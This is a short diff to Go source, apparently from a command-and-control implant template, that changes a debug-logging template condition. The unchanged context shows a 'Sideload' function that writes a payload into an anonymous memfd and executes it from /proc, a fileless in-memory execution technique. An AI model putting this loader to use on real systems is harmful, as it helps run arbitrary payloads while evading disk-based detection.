@@ -29,7 +29,7 @@ import (
 	"syscall"
 	"unsafe"
 
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	"log"
 	//{{end}}
 )
@@ -66,7 +66,7 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	memfdName := randomString(8)
 	memfd, err := syscall.BytePtrFromString(memfdName)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Printf("Error during conversion: %s\n", err)
 		//{{end}}
 		return "", err
@@ -81,12 +81,12 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
 	err = ioutil.WriteFile(fdPath, data, 0755)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Printf("Error writing file to memfd: %s\n", err)
 		//{{end}}
 		return "", err
 	}
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("Data written in %s\n", fdPath)
 	//{{end}}
 	env := os.Environ()
@@ -99,7 +99,7 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	cmd.Env = env
 	cmd.Stdout = &stdOut
 	cmd.Stderr = &stdErr
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("Starging %s\n", cmd.String())
 	//{{end}}
 	wg.Add(1)
@@ -109,7 +109,7 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	if len(stdErr.Bytes()) > 0 {
 		return "", fmt.Errorf(stdErr.String())
 	}
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	log.Printf("Done, stdout: %s\n", stdOut.String())
 	log.Printf("Done, stderr: %s\n", stdErr.String())
 	//{{end}}
